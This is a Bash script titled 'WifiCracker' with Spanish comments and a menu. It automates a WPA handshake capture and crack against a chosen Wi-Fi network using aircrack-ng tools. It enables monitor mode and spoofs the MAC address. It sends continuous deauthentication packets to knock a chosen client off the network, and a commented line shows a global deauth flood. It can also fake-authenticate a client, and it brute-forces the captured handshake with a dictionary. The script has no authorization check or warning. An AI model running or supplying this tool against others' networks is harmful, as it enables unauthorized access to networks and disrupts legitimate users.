# Programa en bash hecho para averiguar la contraseña de un Wifi por medio de
# deautenticación de clientes conectados a la misma - (https://github.com/Marcelorvp/WifiCracker)

# Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra

#!/bin/bash

# ¡¡Debes de ejecutar el programa siendo superusuario!!

monitor="mon0"
usuario=$(whoami)
usuarioNormal="$USER"
value=1

monitorMode(){

  #Tienes que ser root para ejecutar esta opción, de lo contrario no podrás

  if [ "$usuario" = "root" ]; then
    echo " "
    echo "Abriendo configuración de interfaz..."
    echo " "
    sleep 2
    ifconfig
    echo " "
    echo -n "Indique su tarjeta de red Wifi (wlan0, wlp2s0...): "
    read tarjetaRed
    echo " "
    echo "Iniciando modo monitor..."
    sleep 2

    if [ "$value" = "1" ]; then
      airmon-ng start $tarjetaRed
      value=2
      echo " "
      echo "Dando de baja la interfaz mon0"
      echo " "
      sleep 2
      ifconfig mon0 down
      echo "Cambiando direccion MAC..."
      echo " "
      sleep 2
      macchanger -a mon0
      echo " "
      echo "Dando de alta la interfaz mon0"
      echo " "
      sleep 2
      ifconfig mon0 up
      value=2
      echo "¡Terminado!"
      sleep 3
    else
      echo " "
      echo "No es posible, ya estás en modo monitor"
      echo " "
      sleep 4
    fi
  elif [ "$usuario" = "$USER" ]; then
    echo " "
    echo "Para ejecutar esta opción primero debes ser superusuario"
    echo " "
    sleep 3
  fi
}

interfacesMode(){

  echo " "
  echo "Abriendo configuración de interfaz..."
  echo " "
  sleep 2
  ifconfig
  echo " "
  sleep 4

}

monitorDown(){
  
  echo " "
  echo "Dando de baja el modo monitor..."
  echo " "
  sleep 2
  if [ "$value" = "2" ]; then
    airmon-ng stop mon0
    echo " "
    echo "Interfaz mon0 dada de baja con éxito"
    echo " "
    sleep 4
    value=1
  else
    echo "No hay interfaz mon0, tienes que iniciarla con la opción 1"
    sleep 3
  fi

}

wifiScanner(){

  if [ "$value" = "2" ]; then
    echo " "
    echo "Van a escanearse las redes Wifis cercanas..."
    echo " "
    echo "Una vez carguen más o menos todas las redes, presiona Ctrl+C"
    sleep 4
    airodump-ng mon0
    echo " "
    echo -n "Red Wifi que quiere marcar como objetivo: "
    read wifiName
    echo " "
    echo -n "Marque el canal en el que se encuentra: "
    read channelWifi
    echo " "
    echo -n "Nombre que desea ponerle a la carpeta: "
    read folderName
    echo " "
    echo -n "Nombre que desea ponerle al archivo: "
    read archiveName
    echo " "
    echo -n "Escribe tu nombre de usuario del sistema: "
    read userSystem
    echo " "
    echo "Se va a crear una carpeta en el escritorio, esta contendrá toda la información de la red Wifi seleccionada"
    echo " "
    sleep 4
    mkdir /home/$userSystem/Escritorio/$folderName
    cd /home/$userSystem/Escritorio/$folderName
    echo "A continuación vamos a ver la actividad sólo en $wifiName"
    echo " "
    echo "Abra otra terminal, y dejando en ejecución este proceso ejecute la opción 5"
    echo " "
    sleep 7

    # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
    # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC

    airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0

  else
    echo " "
    echo "Inicia el modo monitor primero"
    echo " "
    sleep 2
  fi

}

wifiPassword(){

  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, primero
  # por fines prácticos nos será de utilidad verlo de esta forma)

  echo " "
  echo "Esta opción sólo deberías ejecutarla si ya has hecho los pasos 1, 4 y 5... de lo contrario no obtendrás nada"
  echo " "
  sleep 3
  echo " "
  echo -n "Nombre del diccionario (póngalo en el escritorio, con extensión correspondiente): "
  read dictionaryName
  echo " "
  echo -n "Nombre de la carpeta creada en el paso 4: "
  read folderName
  echo " "
  echo -n "Nombre del archivo creado en el paso 4 (Con extensión correspondiente): "
  read archiveName
  echo " "
  echo -n "Escribe tu nombre de usuario del sistema: "
  read userSystem
  echo " "
  echo "Vamos a proceder a averiguar la contraseña"
  echo " "
  sleep 5
  aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
  sleep 10

}

resetProgram(){

  echo " "
  echo "Esta opción deberías escogerla en caso de haber ya estado usando las anteriores"
  sleep 4
  echo " "
  echo "Dando de baja el modo monitor..."
  echo " "
  sleep 3
  airmon-ng stop $monitor

}

macAttack(){

  echo " "
  echo -n "Introduzca nombre del Wifi: "
  read wifiName
  echo " "
  echo -n "Escriba la dirección MAC del usuario al que desea deautenticar: "
  read macClient
  echo " "
  echo "Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada"
  echo " "
  echo "Es recomendable esperar 1 minuto"
  echo " "
  echo "Cuando el minuto haya pasado, presione Ctrl+C para parar el proceso y desde una nueva terminal escoga la opción 7"
  echo " "
  sleep 13
  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0

  # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
  # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

}

# Escoge esta opción sólo si no hay clientes conectados a la red

fakeAuth(){

  echo " "
  echo "Vamos a proceder a autenticar un falso cliente en la red, desde la Terminal 1 podrás ver cómo este es añadido"
  echo " "
  echo "Posteriormente, selecciona la opción 5 para mandar paquetes de deautenticación a dicho cliente"
  echo " "
  sleep 5
  echo -n "Escribe una dirección MAC (Puedes usar a clientes no asociados o tu propia dirección MAC [La nueva]): "
  read fakeMAC
  echo " "
  echo -n "Escribe el nombre del Wifi: "
  read wifiName
  echo " "
  echo "Procedemos..."
  echo " "
  sleep 3
  aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0

}

while true
  do

    clear
    echo " "
    echo "*** Wifi Cracker ***"
    echo " "
    echo "1. Iniciar el modo monitor "
    echo "2. Mostrar interfaces"
    echo "3. Dar de baja el modo monitor"
    echo "4. Escanear redes wifis"
    echo "5. Deautenticación a dirección MAC"
    echo "6. Falsa autenticación de cliente"
    echo "7. Obtener contraseña Wifi"
    echo "8. Reiniciar programa"
    echo "---------------------------"
    echo "0. Salir "
    echo "---------------------------"
    echo " "
    echo -n "Introduzca una opcion: "
    read opcionMenu

    if [ "$opcionMenu" = "1" ]; then
      monitorMode
    fi
    if [ "$opcionMenu" = "2" ]; then
      interfacesMode
    fi
    if [ "$opcionMenu" = "3" ]; then
      monitorDown
    fi
    if [ "$opcionMenu" = "4" ]; then
      wifiScanner
    fi
    if [ "$opcionMenu" = "5" ]; then
      macAttack
    fi
    if [ "$opcionMenu" = "6" ]; then
      fakeAuth
    fi
    if [ "$opcionMenu" = "7" ]; then
      wifiPassword
    fi
    if [ "$opcionMenu" = "8" ]; then
      resetProgram
    fi
    if [ "$opcionMenu" = "0" ]; then
      echo " "
      exit
    fi

done
